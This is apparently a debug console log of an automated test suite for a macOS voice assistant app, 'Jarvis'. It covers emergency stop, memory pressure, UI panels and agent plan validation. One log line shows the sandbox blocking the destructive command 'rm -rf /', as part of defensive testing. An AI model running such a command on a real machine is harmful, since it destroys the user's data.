+2026-09-26 12:55:55.603084+0530 Jarvis[32358:4571888] [events] ⚡ MemoryPressureChangedEvent
+  ✓ Simulated memory pressure transition to CRITICAL
+  ✓ Refuses model load under CRITICAL memory pressure
+  ✓ ResourceManager marks test model for eviction under pressure
+2026-09-26 12:55:55.603136+0530 Jarvis[32358:4571888] [resources] Model unloaded: test-reflex-model
+  ✓ Model unloaded and RAM freed
+2026-09-26 12:55:55.603142+0530 Jarvis[32358:4571888] [resources] Memory pressure: critical → nominal (available: 0MB)
+2026-09-26 12:55:55.603148+0530 Jarvis[32358:4571888] [events] ⚡ MemoryPressureChangedEvent
+  ✓ Memory pressure restored to NOMINAL
+
+─── Phase 11: Emergency Stop System-Wide Propagation ───
+2026-09-26 12:55:55.603164+0530 Jarvis[32358:4571888] [actions] Created task [E1141721]: 'Task To Be Aborted'
+2026-09-26 12:55:55.603173+0530 Jarvis[32358:4571888] [actions] Task [E1141721] transitioned: CREATED -> RUNNING
+  ✓ Task running prior to emergency stop
+2026-09-26 12:55:55.603196+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.603245+0530 Jarvis[32358:4571888] [voice] TTS stopped immediately in 0.02ms
+2026-09-26 12:55:55.603253+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.603264+0530 Jarvis[32358:4571888] [security] Emergency stop handled in pipeline: 'STOP'
+  ✓ AudioPlayer stopped on emergency signal
+  ✓ TTSEngine stopped on emergency signal
+2026-09-26 12:55:55.603279+0530 Jarvis[32358:4571888] [actions] Task [E1141721] transitioned: RUNNING -> CANCELLED
+  ✓ Task aborted and evicted from active task set
+
+─── Phase 12: Design Tokens & Styling ───
+  ✓ DesignTokens specifies 24pt panel corner radius
+  ✓ DesignTokens specifies 8pt small spacing
+  ✓ DesignTokens specifies 16pt medium spacing
+  ✓ DesignTokens specifies 24pt large spacing
+
+─── Phase 12: Floating Panel HUD Architecture ───
+2026-09-26 12:55:55.650339+0530 Jarvis[32358:4571917] [Application] Error registering app with intents framework: Error Domain=LNProcessInstanceRegistryClientErrorDomain Code=4 "Registration with the Process Instance Registry is asynchronous; use registerWithCompletionHandler: to obtain the process instance identifier." UserInfo={NSLocalizedDescription=Registration with the Process Instance Registry is asynchronous; use registerWithCompletionHandler: to obtain the process instance identifier.}
+2026-09-26 12:55:55.660826+0530 Jarvis[32358:4571916] [Connection] Unable to get remoteObjectProxy, error: Error Domain=NSCocoaErrorDomain Code=4097 "connection to service named com.apple.linkd.autoShortcut" UserInfo={NSDebugDescription=connection to service named com.apple.linkd.autoShortcut}
+2026-09-26 12:55:55.661006+0530 Jarvis[32358:4571916] [Connection] Unable to register with Process Instance Registry, error: Error Domain=NSCocoaErrorDomain Code=4097 "connection to service named com.apple.linkd.autoShortcut" UserInfo={NSDebugDescription=connection to service named com.apple.linkd.autoShortcut}
+2026-09-26 12:55:55.775035+0530 Jarvis[32358:4571916] [crashhandler]         AUCrashHandler.mm:126   invalidated
+2026-09-26 12:55:55.775035+0530 Jarvis[32358:4571917] [crashhandler]         AUCrashHandler.mm:126   invalidated
+2026-09-26 12:55:55.775034+0530 Jarvis[32358:4571914] [crashhandler]         AUCrashHandler.mm:126   invalidated
+  ✓ FloatingPanel window level is .floating
+  ✓ FloatingPanel is designated as floating panel
+  ✓ FloatingPanel can join all spaces
+  ✓ FloatingPanel is full-screen auxiliary overlay
+  ✓ FloatingPanel styleMask contains .nonactivatingPanel
+  ✓ FloatingPanel styleMask contains .borderless
+
+─── Phase 12: UI View Models & Settings Stores ───
+  ✓ APIKeyInputStore manages in-memory credentials safely
+  ✓ OverlayViewModel manages HUD input text
+  ✓ OverlayViewModel tracks assistant response text
+
+─── Phase 13: Agent Plan Parser & Validator ───
+  ✓ Valid plan JSON parses
+  ✓ Parsed plan preserves goal
+  ✓ Parsed plan has 1 step
+  ✓ Parsed step references open_app
+  ✓ Valid plan passes ToolRegistry-grounded validation
+  ✓ Fenced/prose-wrapped JSON extracts
+  ✓ Unknown/hallucinated tool rejected with unknownTool
+  ✓ Missing required argument rejected
+  ✓ Undeclared (smuggled) argument rejected
+  ✓ Non-integer value for int argument rejected
+2026-09-26 12:55:55.842021+0530 Jarvis[32358:4571888] [security] BLOCKED (layer 1 exact): 'rm -rf /' contains 'rm -rf /'
+  ✓ Unsafe shell command rejected by plan-time sandbox check
+  ✓ Non-JSON output rejected with noJSONFound
+  ✓ Empty steps array rejected
+  ✓ tool:null composition step validates
+  ✓ JSON number argument coerced to string for typed validation
+  ✓ Replan failure context clipped to 160 chars
+  ✓ Replan keeps at most 2 prior observations
+
+─── Phase 14: Planner Reliability Hardening (D.5) ───
+  ✓ Multi-object output parses to the first valid plan
+  ✓ Orphaned purpose brace-slip repaired
+  ✓ JSON terminator echo stripped from goal/arguments
+  ✓ Boolean argument stringifies as true/false
+  ✓ Empty shell command rejected as unsafe
+  ✓ Router + hint layer: safe echo, metachar refusal, clipboard write, say, no semantic overreach, hint decisions (11 checks)
+
+══════════════════════════════════════════
+  Results: 299 passed, 4 failed
+══════════════════════════════════════════
+
+❌ SOME TESTS FAILED (4)
+Process 32358 launched: '/Users/jayanthpranaykonada/Zia/.build/out/Products/Debug/Jarvis' (arm64)
+Process 32358 exited with status = 0 (0x00000000)
+(lldb) quit
